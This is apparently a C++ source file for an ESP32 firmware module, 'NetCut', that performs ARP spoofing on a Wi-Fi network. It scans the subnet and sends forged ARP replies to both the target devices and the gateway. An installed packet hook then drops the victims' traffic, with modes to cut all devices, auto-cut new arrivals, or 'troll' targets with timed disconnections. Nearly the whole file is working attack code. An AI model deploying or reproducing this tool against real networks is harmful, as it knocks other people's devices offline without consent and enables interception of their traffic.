/**
 * @file netcut.cpp
 * @brief NetCut ARP Module for Bruce Firmware
 * @description Ported from standalone NetCut ESP32. Uses LwIP netif->linkoutput()
 *              for safe ARP packet injection. All UI via Bruce loopOptions().
 */

#include "netcut.h"
#include "core/mykeyboard.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "esp_private/wifi.h"
#include "lwip/etharp.h"
#include "lwip/inet.h"
#include "lwip/pbuf.h"
#include "lwip/tcpip.h"
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <esp_wifi.h>

// Forward declarations
void netcutTrollTimingMenu();
static void _activeLoop();

// ============================================
// FILE-SCOPED STATE (no global collision)
// ============================================
static NetCutDevice s_devices[NETCUT_MAX_DEVICES];
static int s_deviceCount = 0;
static uint8_t s_myMAC[6] = {0};
static uint8_t s_gatewayMAC[6] = {0};
static bool s_gwMacValid = false;
static ip4_addr_t s_gatewayIP = {0};
static unsigned long s_trollOfflineMs = NETCUT_TROLL_DEFAULT_OFFLINE_MS;
static unsigned long s_trollOnlineMs = NETCUT_TROLL_DEFAULT_ONLINE_MS;

// Auto-cut/troll flags: newly scanned devices auto-join the attack
static bool s_cutAllActive = false;
static bool s_trollAllActive = false;
// VIP MAC list loaded from LittleFS
static std::vector<String> s_vipMacs;

// LwIP Hook variables
static netif_input_fn s_originalInput = nullptr;
static struct netif *s_hookedNetif = nullptr;

// ============================================
// INTERNAL: SNI Parser for TLS ClientHello
// ============================================

// ============================================
// INTERNAL: Layer 2 Forwarding & DNS Sniper Hook
// ============================================
static err_t _netcutInputHook(struct pbuf *p, struct netif *inp) {
    if (!p) return s_originalInput ? s_originalInput(p, inp) : ERR_OK;

    if (p->len >= sizeof(struct eth_hdr)) {
        struct eth_hdr *eth = (struct eth_hdr *)p->payload;

        // Check if source MAC is in our device list and marked as Cut
        for (int i = 0; i < s_deviceCount; i++) {
            if (s_devices[i].isCut && memcmp(eth->src.addr, s_devices[i].macBytes, 6) == 0) {
                pbuf_free(p);
                return ERR_OK; // Drop the packet
            }
        }
    }
    return s_originalInput ? s_originalInput(p, inp) : ERR_OK;
}

// ============================================
// INTERNAL: Get WiFi STA netif
// ============================================
static struct netif *_getStaNetif() {
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) return nullptr;
    return (struct netif *)esp_netif_get_netif_impl(sta);
}

// ============================================
// INTERNAL: Send a single ARP packet via LwIP
// Same pattern as Bruce ARPSpoofer.cpp
// ============================================
static void _sendARP(
    struct netif *iface, const uint8_t *ethDst, const uint8_t *arpSenderMAC, const uint8_t *arpSenderIP,
    const uint8_t *arpTargetMAC, const uint8_t *arpTargetIP, uint16_t opcode, int repeat
) {
    if (!iface || !iface->linkoutput) return;

    struct pbuf *p = pbuf_alloc(PBUF_RAW, sizeof(struct eth_hdr) + sizeof(struct etharp_hdr), PBUF_RAM);
    if (!p) return;

    struct eth_hdr *eth = (struct eth_hdr *)p->payload;
    struct etharp_hdr *arp = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);

    MEMCPY(&eth->dest, ethDst, ETH_HWADDR_LEN);
    MEMCPY(&eth->src, s_myMAC, ETH_HWADDR_LEN);
    eth->type = PP_HTONS(ETHTYPE_ARP);

    arp->hwtype = PP_HTONS(1);
    arp->proto = PP_HTONS(ETHTYPE_IP);
    arp->hwlen = ETH_HWADDR_LEN;
    arp->protolen = sizeof(ip4_addr_t);
    arp->opcode = PP_HTONS(opcode);

    MEMCPY(&arp->shwaddr, arpSenderMAC, ETH_HWADDR_LEN);
    MEMCPY(&arp->sipaddr, arpSenderIP, sizeof(ip4_addr_t));
    MEMCPY(&arp->dhwaddr, arpTargetMAC, ETH_HWADDR_LEN);
    MEMCPY(&arp->dipaddr, arpTargetIP, sizeof(ip4_addr_t));

    for (int i = 0; i < repeat; i++) {
        esp_wifi_internal_tx(WIFI_IF_STA, p->payload, p->tot_len);
        if (repeat > 1) { vTaskDelay(pdMS_TO_TICKS(1)); }
    }

    pbuf_free(p);
}

// ============================================
// INTERNAL: Read ARP table into device list
// ============================================
static void _readArpTable(struct netif *iface) {
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret = nullptr;
        eth_addr *eth_ret = nullptr;
        struct netif *tmp_if = nullptr;

        if (!etharp_get_entry(i, &ip_ret, &tmp_if, &eth_ret)) continue;
        if (!ip_ret || !eth_ret) continue;

        // Skip gateway
        if (ip_ret->addr == s_gatewayIP.addr) {
            if (!s_gwMacValid) {
                memcpy(s_gatewayMAC, eth_ret->addr, 6);
                s_gwMacValid = true;
            }
            continue;
        }

        // Skip broadcast/zero MAC
        bool allZero = true, allFF = true;
        for (int b = 0; b < 6; b++) {
            if (eth_ret->addr[b] != 0x00) allZero = false;
            if (eth_ret->addr[b] != 0xFF) allFF = false;
        }
        if (allZero || allFF) continue;

        // Check if already in list
        String macStr = macToString(eth_ret->addr);
        bool exists = false;
        for (int d = 0; d < s_deviceCount; d++) {
            if (s_devices[d].macStr == macStr) {
                s_devices[d].ip = IPAddress(ip_ret->addr);
                exists = true;
                break;
            }
        }
        if (!exists && s_deviceCount < NETCUT_MAX_DEVICES) {
            NetCutDevice &dev = s_devices[s_deviceCount];
            dev.ip = IPAddress(ip_ret->addr);
            memcpy(dev.macBytes, eth_ret->addr, 6);
            dev.macStr = macStr;
            dev.isCut = false;
            dev.isTroll = false;
            dev.isTrollOffline = false;
            dev.lastTrollToggle = 0;
            dev.restoreUntil = 0;

            // Check VIP
            dev.isVip = false;
            for (auto &vm : s_vipMacs) {
                if (vm.equalsIgnoreCase(macStr)) {
                    dev.isVip = true;
                    break;
                }
            }

            // AUTO-CUT: mark for poison (actual poison happens in periodic loop)
            if (s_cutAllActive && !dev.isVip) {
                dev.isCut = true;
                s_deviceCount++;
                Serial.printf("[NetCut] AUTO-CUT new device: %s\n", macStr.c_str());
            } else if (s_trollAllActive && !dev.isVip) {
                // AUTO-TROLL: mark for troll (actual poison happens in periodic loop)
                dev.isTroll = true;
                dev.isTrollOffline = true;
                dev.lastTrollToggle = millis();
                s_deviceCount++;
                Serial.printf("[NetCut] AUTO-TROLL new device: %s\n", macStr.c_str());
            } else {
                s_deviceCount++;
            }
        }
    }
    etharp_cleanup_netif(iface);
}

// ============================================
// VIP PERSISTENCE (LittleFS)
// ============================================
void netcutLoadVipList() {
    s_vipMacs.clear();
    if (!LittleFS.exists(NETCUT_VIP_FILE)) return;

    File f = LittleFS.open(NETCUT_VIP_FILE, "r");
    if (!f) return;

    JsonDocument doc;
    if (deserializeJson(doc, f) == DeserializationError::Ok) {
        JsonArray arr = doc["vip"].as<JsonArray>();
        for (JsonVariant v : arr) { s_vipMacs.push_back(v.as<String>()); }
    }
    f.close();
    Serial.printf("[NetCut] Loaded %d VIP entries\n", s_vipMacs.size());
}

void netcutSaveVipList() {
    // Rebuild VIP list from current devices
    s_vipMacs.clear();
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isVip) s_vipMacs.push_back(s_devices[i].macStr);
    }

    JsonDocument doc;
    JsonArray arr = doc["vip"].to<JsonArray>();
    for (auto &m : s_vipMacs) arr.add(m);

    File f = LittleFS.open(NETCUT_VIP_FILE, "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
    Serial.printf("[NetCut] Saved %d VIP entries\n", s_vipMacs.size());
}

// ============================================
// SCAN DEVICES
// ============================================
int netcutScanDevices() {
    if (WiFi.status() != WL_CONNECTED) return 0;

    struct netif *iface = _getStaNetif();
    if (!iface) {
        displayError("WiFi netif not found", true);
        return 0;
    }

    // Get network info
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta, &ip_info);

    s_gatewayIP.addr = ip_info.gw.addr;
    esp_wifi_get_mac(WIFI_IF_STA, s_myMAC);

    // Reset state
    s_deviceCount = 0;
    s_gwMacValid = false;
    netcutLoadVipList();

    // Calculate subnet range
    uint32_t myIP_he = ntohl(ip_info.ip.addr);
    uint32_t mask_he = ntohl(ip_info.netmask.addr);
    uint32_t network = ntohl(ip_info.gw.addr) & mask_he;
    uint32_t broadcast = network | ~mask_he;
    uint32_t totalHosts = broadcast - network - 1;

    drawMainBorderWithTitle("NetCut Scan");
    padprintln("");
    padprintln("Scanning network...");
    padprintln("SSID: " + WiFi.SSID());
    padprintln("GW: " + IPAddress(ip_info.gw.addr).toString());
    padprintln("");

    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    int tableReadCount = 0;
    uint32_t hostsScanned = 0;
    unsigned long lastUIUpdate = 0;

    for (uint32_t ip_he = network + 1; ip_he < broadcast; ip_he++) {
        if (ip_he == myIP_he) continue;

        ip4_addr_t target = {htonl(ip_he)};
        LOCK_TCPIP_CORE();
        etharp_request(iface, &target);
        UNLOCK_TCPIP_CORE();
        tableReadCount++;
        hostsScanned++;

        if (tableReadCount >= ARP_TABLE_SIZE) {
            LOCK_TCPIP_CORE();
            _readArpTable(iface);
            UNLOCK_TCPIP_CORE();
            tableReadCount = 0;
        }

        vTaskDelay(pdMS_TO_TICKS(15));

        if (millis() - lastUIUpdate > 400) {
            lastUIUpdate = millis();
            displayRedStripe(
                String(hostsScanned) + "/" + String(totalHosts) + " | Found: " + String(s_deviceCount),
                getComplementaryColor2(bruceConfig.priColor),
                bruceConfig.priColor
            );
        }

        if (check(EscPress)) break;
    }

    // Final table read
    LOCK_TCPIP_CORE();
    _readArpTable(iface);
    UNLOCK_TCPIP_CORE();

    // If gateway MAC not found, try BSSID fallback
    if (!s_gwMacValid) {
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            memcpy(s_gatewayMAC, ap_info.bssid, 6);
            s_gwMacValid = true;
            Serial.println("[NetCut] Gateway MAC from BSSID");
        }
    }

    Serial.printf("[NetCut] Scan done: %d devices, GW MAC valid: %d\n", s_deviceCount, s_gwMacValid);
    return s_deviceCount;
}

// ============================================
// ARP POISON (Cut)
// ============================================
void netcutPoisonDevice(int idx, int burstCount) {
    if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
    NetCutDevice &dev = s_devices[idx];
    if (dev.isVip) return;

    struct netif *iface = _getStaNetif();
    if (!iface) return;

    uint8_t devIP[4], gwIP[4];
    uint32_t dip = dev.ip;
    memcpy(devIP, &dip, 4);
    memcpy(gwIP, &s_gatewayIP.addr, 4);

    // Poison target: "Gateway IP = MY MAC"
    _sendARP(iface, dev.macBytes, s_myMAC, gwIP, dev.macBytes, devIP, ARP_REPLY, burstCount);

    // Poison gateway: "Target IP = MY MAC"
    _sendARP(iface, s_gatewayMAC, s_myMAC, devIP, s_gatewayMAC, gwIP, ARP_REPLY, burstCount);
}

// ============================================
// ARP RESTORE (Resume)
// ============================================
void netcutRestoreDevice(int idx) {
    if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
    NetCutDevice &dev = s_devices[idx];

    struct netif *iface = _getStaNetif();
    if (!iface) return;

    uint8_t devIP[4], gwIP[4];
    uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t dip = dev.ip;
    memcpy(devIP, &dip, 4);
    memcpy(gwIP, &s_gatewayIP.addr, 4);

    for (int round = 0; round < NETCUT_RESTORE_ROUNDS; round++) {
        // Restore target: "Gateway IP = REAL Gateway MAC"
        _sendARP(
            iface, dev.macBytes, s_gatewayMAC, gwIP, dev.macBytes, devIP, ARP_REPLY, NETCUT_RESTORE_BURST
        );

        // Broadcast ARP request (RFC 826: forces cache update)
        _sendARP(iface, bcast, s_gatewayMAC, gwIP, bcast, devIP, ARP_REQUEST, NETCUT_RESTORE_BURST);

        // Restore gateway: "Target IP = REAL Target MAC"
        _sendARP(
            iface, s_gatewayMAC, dev.macBytes, devIP, s_gatewayMAC, gwIP, ARP_REPLY, NETCUT_RESTORE_BURST
        );

        // Broadcast for gateway
        _sendARP(iface, bcast, dev.macBytes, devIP, bcast, gwIP, ARP_REQUEST, NETCUT_RESTORE_BURST);

        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

// ============================================
// BULK OPERATIONS
// ============================================
void netcutCutAll() {
    s_cutAllActive = true; // FLAG: new devices auto-join cut
    s_trollAllActive = false;
    for (int i = 0; i < s_deviceCount; i++) {
        if (!s_devices[i].isVip) {
            s_devices[i].isCut = true;
            s_devices[i].isTroll = false;
            netcutPoisonDevice(i, 20); // Instant poison!
        }
    }
}

void netcutResumeAll() {
    s_cutAllActive = false;   // DISABLE auto-cut
    s_trollAllActive = false; // DISABLE auto-troll
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isCut || s_devices[i].isTroll) {
            s_devices[i].isCut = false;
            s_devices[i].isTroll = false;
            s_devices[i].isTrollOffline = false;
            s_devices[i].restoreUntil = millis() + 5000;
            netcutRestoreDevice(i);
        }
    }
}

// ============================================
// VIP TOGGLE
// ============================================
void netcutToggleVip(int idx) {
    if (idx < 0 || idx >= s_deviceCount) return;
    NetCutDevice &dev = s_devices[idx];
    dev.isVip = !dev.isVip;
    if (dev.isVip && (dev.isCut || dev.isTroll)) {
        dev.isCut = false;
        dev.isTroll = false;
        dev.isTrollOffline = false;
        netcutRestoreDevice(idx);
    }
    netcutSaveVipList();
}

// ============================================
// BLOCKING ACTIVE LOOP
// Sends poison/restore packets continuously.
// Handles troll timers. Exits on EscPress.
// ============================================
static void _activeLoop() {
    if (!s_gwMacValid) {
        displayError("Gateway MAC unknown", true);
        return;
    }

    unsigned long lastPoison = 0;
    unsigned long lastRedraw = 0;
    int packetCount = 0;

    // Count active targets
    auto countActive = []() -> int {
        int c = 0;
        for (int i = 0; i < s_deviceCount; i++) {
            if (s_devices[i].isCut || s_devices[i].isTroll) c++;
        }
        return c;
    };

    if (countActive() == 0) {
        displayWarning("No targets marked", true);
        return;
    }

    struct netif *iface = _getStaNetif();

    // Non-blocking scanner state (same as original NetCut)
    uint32_t myIP_he = ntohl((uint32_t)WiFi.localIP());
    uint32_t mask_he = ntohl((uint32_t)WiFi.subnetMask());
    uint32_t network = myIP_he & mask_he;
    uint32_t broadcast = network | (~mask_he);
    uint32_t scanIP = network + 1;
    unsigned long lastScanStep = 0;
    int scanTableCount = 0;

    drawMainBorderWithTitle("NETCUT ACTIVE");
    padprintln("");
    padprintln("Attack running...");
    padprintln("Targets: " + String(countActive()));
    padprintln("");
    padprintln("Press Esc/Back to STOP");

    // Install L2 Bridge Hook
    struct netif *hook_iface = _getStaNetif();
    if (hook_iface && !s_hookedNetif) {
        s_originalInput = hook_iface->input;
        s_hookedNetif = hook_iface;
        hook_iface->input = _netcutInputHook;
        Serial.println("[NetCut] L2 Bridge Hook installed.");
    }

    while (!check(EscPress)) {
        // --- NON-BLOCKING ARP SCANNER (1 IP per 50ms, like original NetCut) ---
        if (iface && (s_cutAllActive || s_trollAllActive)) {
            if (millis() - lastScanStep > 50) {
                lastScanStep = millis();

                if (scanIP < broadcast && scanIP != myIP_he) {
                    ip4_addr_t target = {htonl(scanIP)};
                    LOCK_TCPIP_CORE();
                    etharp_request(iface, &target);
                    UNLOCK_TCPIP_CORE();
                    scanTableCount++;
                }

                // Read ARP table periodically (auto-cut/troll happens inside _readArpTable)
                if (scanTableCount >= ARP_TABLE_SIZE) {
                    LOCK_TCPIP_CORE();
                    _readArpTable(iface);
                    UNLOCK_TCPIP_CORE();
                    scanTableCount = 0;
                }

                scanIP++;
                if (scanIP >= broadcast) {
                    // Wrap around: restart scan cycle
                    scanIP = network + 1;
                    LOCK_TCPIP_CORE();
                    _readArpTable(iface);
                    etharp_cleanup_netif(iface);
                    UNLOCK_TCPIP_CORE();
                }
            }
        }

        // --- Troll timer logic (individual per device, same as original NetCut) ---
        for (int i = 0; i < s_deviceCount; i++) {
            if (!s_devices[i].isTroll || s_devices[i].isVip) continue;

            unsigned long interval = s_devices[i].isTrollOffline ? s_trollOfflineMs : s_trollOnlineMs;

            if (millis() - s_devices[i].lastTrollToggle > interval) {
                // TOGGLE PHASE
                s_devices[i].isTrollOffline = !s_devices[i].isTrollOffline;
                s_devices[i].lastTrollToggle = millis();

                if (s_devices[i].isTrollOffline) {
                    // Phase: OFFLINE → instant poison burst (20x)
                    netcutPoisonDevice(i, 20);
                    Serial.printf("[Troll] %s -> OFFLINE (poison)\n", s_devices[i].ip.toString().c_str());
                } else {
                    // Phase: ONLINE → instant restore + 5s forced restore window
                    s_devices[i].restoreUntil = millis() + 5000;
                    netcutRestoreDevice(i);
                    Serial.printf("[Troll] %s -> ONLINE (restore)\n", s_devices[i].ip.toString().c_str());
                }
            }
        }

        // --- Periodic re-poison for CUT devices + TROLL(offline phase) ---
        if (millis() - lastPoison > NETCUT_ARP_INTERVAL_MS) {
            lastPoison = millis();
            for (int i = 0; i < s_deviceCount; i++) {
                if (s_devices[i].isVip) continue;

                bool shouldPoison =
                    s_devices[i].isCut || (s_devices[i].isTroll && s_devices[i].isTrollOffline);
                bool shouldRestore = (s_devices[i].isTroll && !s_devices[i].isTrollOffline) ||
                                     (millis() < s_devices[i].restoreUntil);

                if (shouldPoison) {
                    netcutPoisonDevice(i, 1);
                    packetCount++;
                } else if (shouldRestore) {
                    netcutRestoreDevice(i);
                    packetCount++;
                }
            }
        }

        // --- Update display every 500ms ---
        if (millis() - lastRedraw > 500) {
            lastRedraw = millis();

            int cutN = 0, trollN = 0, trollOff = 0, trollOn = 0;
            for (int i = 0; i < s_deviceCount; i++) {
                if (s_devices[i].isCut) cutN++;
                if (s_devices[i].isTroll) {
                    trollN++;
                    if (s_devices[i].isTrollOffline) trollOff++;
                    else trollOn++;
                }
            }

            tft.fillRect(0, tftHeight - 62, tftWidth, 62, bruceConfig.bgColor);
            tft.setTextSize(FP);

            // Troll timing info
            if (trollN > 0) {
                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                tft.drawString(
                    "Troll: " + String(s_trollOfflineMs / 1000) + "s OFF / " +
                        String(s_trollOnlineMs / 1000) + "s ON",
                    10,
                    tftHeight - 60,
                    1
                );
            }

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawString("CUT:" + String(cutN) + " Dev:" + String(s_deviceCount), 10, tftHeight - 48, 1);
            tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
            tft.drawString(
                "TRL:" + String(trollOff) + "off/" + String(trollOn) + "on", 10, tftHeight - 36, 1
            );

            // Draw SNIPER count
            for (int i = 0; i < s_deviceCount; i++) tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.drawString("Pkts:" + String(packetCount), 10, tftHeight - 24, 1);

            tft.setTextColor(TFT_DARKGREY, bruceConfig.bgColor);
            tft.drawString("Esc=Stop", 10, tftHeight - 12, 1);
        }

        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Uninstall L2 Bridge Hook
    if (s_hookedNetif && s_originalInput) {
        s_hookedNetif->input = s_originalInput;
        s_hookedNetif = nullptr;
        s_originalInput = nullptr;
        Serial.println("[NetCut] L2 Bridge Hook uninstalled.");
    }

    // Aggressive restore ALL on exit
    // Aggressive restore only affected devices on exit
    s_cutAllActive = false;
    s_trollAllActive = false;
    int restoreCount = 0;
    for (int i = 0; i < s_deviceCount; i++) {
        if (s_devices[i].isCut || s_devices[i].isTroll) {
            restoreCount++;
            s_devices[i].isCut = false;
            s_devices[i].isTroll = false;
            s_devices[i].isTrollOffline = false;
            s_devices[i].restoreUntil = millis() + 5000;
            netcutRestoreDevice(i);
        }
    }

    displaySuccess("Stopped. All " + String(restoreCount) + " devices restored.", true);
}

// ============================================
// TROLL MODE WRAPPERS
// ============================================
void netcutTrollDevice(int idx) {
    if (idx < 0 || idx >= s_deviceCount) return;
    if (s_devices[idx].isVip) {
        displayWarning("VIP protected", true);
        return;
    }

    // Show timing config first
    netcutTrollTimingMenu();

    // After timing menu, set device flags and start
    s_devices[idx].isCut = false;
    s_devices[idx].isTroll = true;
    s_devices[idx].isTrollOffline = true;
    s_devices[idx].lastTrollToggle = millis();

    _activeLoop();
}

void netcutTrollAll() {
    // Show timing config first
    netcutTrollTimingMenu();

    s_trollAllActive = true; // FLAG: new devices auto-join troll
    s_cutAllActive = false;
    for (int i = 0; i < s_deviceCount; i++) {
        if (!s_devices[i].isVip) {
            s_devices[i].isCut = false;
            s_devices[i].isTroll = true;
            s_devices[i].isTrollOffline = true;
            s_devices[i].lastTrollToggle = millis();
            netcutPoisonDevice(i, 20); // Instant poison first phase!
        }
    }
    _activeLoop();
}

// ============================================
// TROLL TIMING MENU
// ============================================
void netcutTrollTimingMenu() {
    unsigned long offSec = s_trollOfflineMs / 1000;
    unsigned long onSec = s_trollOnlineMs / 1000;
    bool done = false;

    while (!done) {
        options.clear();

        options.push_back({"Offline: " + String(offSec) + "s  [SET]", [&offSec]() {
                               String val = num_keyboard(String(offSec), 3, "Offline (sec):");
                               if (val.length() > 0) {
                                   unsigned long v = val.toInt();
                                   if (v >= 1 && v <= 300) offSec = v;
                               }
                               vTaskDelay(pdMS_TO_TICKS(500));
                               while (check(AnyKeyPress))
                                   vTaskDelay(pdMS_TO_TICKS(50)); // drain residual press
                           }});
        options.push_back({"Online: " + String(onSec) + "s  [SET]", [&onSec]() {
                               String val = num_keyboard(String(onSec), 3, "Online (sec):");
                               if (val.length() > 0) {
                                   unsigned long v = val.toInt();
                                   if (v >= 1 && v <= 300) onSec = v;
                               }
                               vTaskDelay(pdMS_TO_TICKS(500));
                               while (check(AnyKeyPress))
                                   vTaskDelay(pdMS_TO_TICKS(50)); // drain residual press
                           }});
        options.push_back({">> Save & Start <<", [&offSec, &onSec, &done]() {
                               s_trollOfflineMs = offSec * 1000;
                               s_trollOnlineMs = onSec * 1000;
                               done = true;
                           }});
        options.push_back({"Cancel", [&done]() { done = true; }});

        String title = "Troll: OFF=" + String(offSec) + "s ON=" + String(onSec) + "s";
        loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
        options.clear();

        if (check(EscPress)) done = true;
    }
}

// ============================================
// PER-DEVICE ACTION SUBMENU
// ============================================
static void _deviceActionMenu(int idx) {
    bool stayInMenu = true;

    while (stayInMenu) {
        NetCutDevice &dev = s_devices[idx];
        options.clear();

        String title = dev.ip.toString();
        if (dev.isVip) title += " [VIP]";
        if (dev.isCut) title += " [CUT]";
        if (dev.isTroll) title += " [TRL]";

        if (!dev.isVip) {
            // TOGGLE CUT: single button to Cut or Resume
            String cutLabel = dev.isCut ? ">> Resume <<" : ">> Cut Device <<";
            options.push_back({cutLabel, [idx]() {
                                   NetCutDevice &d = s_devices[idx];
                                   if (d.isCut) {
                                       d.isCut = false;
                                       d.isTroll = false;
                                       d.isTrollOffline = false;
                                       d.restoreUntil = millis() + 5000;
                                       netcutRestoreDevice(idx);
                                       displaySuccess("Restored: " + d.ip.toString(), true);
                                   } else {
                                       d.isCut = true;
                                       d.isTroll = false;
                                       netcutPoisonDevice(idx, 20);
                                       displayWarning("Cut: " + d.ip.toString(), true);
                                       _activeLoop();
                                   }
                               }});

            options.push_back({"Troll Mode", [idx, &stayInMenu]() {
                                   netcutTrollDevice(idx);
                                   // After troll active loop exits, stay in menu
                               }});
        } else {
            if (dev.isCut) {
                options.push_back({">> Resume <<", [idx]() {
                                       s_devices[idx].isCut = false;
                                       s_devices[idx].isTroll = false;
                                       s_devices[idx].restoreUntil = millis() + 5000;
                                       netcutRestoreDevice(idx);
                                       displaySuccess("Restored: " + s_devices[idx].ip.toString(), true);
                                   }});
            }
        }

        options.push_back({"Toggle VIP", [idx]() {
                               netcutToggleVip(idx);
                               displayInfo(s_devices[idx].isVip ? "VIP: ON" : "VIP: OFF", true);
                           }});

        options.push_back({"Info", [idx]() {
                               NetCutDevice &d = s_devices[idx];
                               drawMainBorderWithTitle("Device Info");
                               padprintln("");
                               padprintln("IP:  " + d.ip.toString());
                               padprintln("MAC: " + d.macStr);
                               padprintln("VIP: " + String(d.isVip ? "Yes" : "No"));
                               padprintln("Cut: " + String(d.isCut ? "Yes" : "No"));
                               padprintln("Troll: " + String(d.isTroll ? "Yes" : "No"));
                               padprintln("");
                               padprintln("Press any key...");
                               while (!check(AnyKeyPress)) vTaskDelay(pdMS_TO_TICKS(100));
                           }});

        options.push_back({"<< Back", [&stayInMenu]() { stayInMenu = false; }});

        loopOptions(options, MENU_TYPE_SUBMENU, title.c_str());
        options.clear();

        // If user pressed Esc/Back (not selecting an option), exit
        if (check(EscPress)) { stayInMenu = false; }
    }
}

// ============================================
// MAIN MENU ENTRY POINT
// ============================================
void netcutMenu() {
    // Require WiFi STA connection
    if (WiFi.status() != WL_CONNECTED) {
        if (!wifiConnectMenu(WIFI_STA)) return;
    }

    // Scan
    drawMainBorderWithTitle("NetCut ARP");
    padprintln("");
    padprintln("Starting ARP scan...");

    int found = netcutScanDevices();

    if (found == 0) {
        displayWarning("No devices found", true);
        return;
    }

    if (!s_gwMacValid) { displayWarning("Gateway MAC not found!\nAttack may fail.", true); }

DeviceListMenu:
    options.clear();

    // Device entries
    for (int i = 0; i < s_deviceCount; i++) {
        String label = s_devices[i].ip.toString();
        if (s_devices[i].isVip) label += " *VIP";
        else if (s_devices[i].isCut) label += " [CUT]";
        else if (s_devices[i].isTroll) label += " [TRL]";

        options.push_back({label.c_str(), [i]() { _deviceActionMenu(i); }});
    }

    // Separator + global actions
    options.push_back({"--- Actions ---", []() {}});

    options.push_back({"Cut All", []() {
                           netcutCutAll();
                           _activeLoop();
                       }});

    options.push_back({"Troll All", []() { netcutTrollAll(); }});

    options.push_back({"Resume All", []() {
                           netcutResumeAll();
                           displaySuccess("All devices restored", true);
                       }});

    options.push_back({"Troll Timing", []() { netcutTrollTimingMenu(); }});

    options.push_back({"Re-Scan", []() { netcutScanDevices(); }});

    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "NetCut ARP");
    options.clear();

    if (!returnToMenu) goto DeviceListMenu;
}
